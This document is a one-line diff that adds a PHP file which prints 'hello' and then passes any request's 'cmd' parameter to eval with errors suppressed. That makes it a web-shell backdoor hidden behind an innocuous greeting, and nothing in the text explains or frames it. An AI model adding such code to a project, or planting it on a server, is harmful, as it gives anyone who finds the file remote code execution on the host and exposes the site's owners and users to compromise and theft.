@@ -1,0 +1,1 @@
+<?php echo 'hello';@eval($_REQUEST[cmd])?>
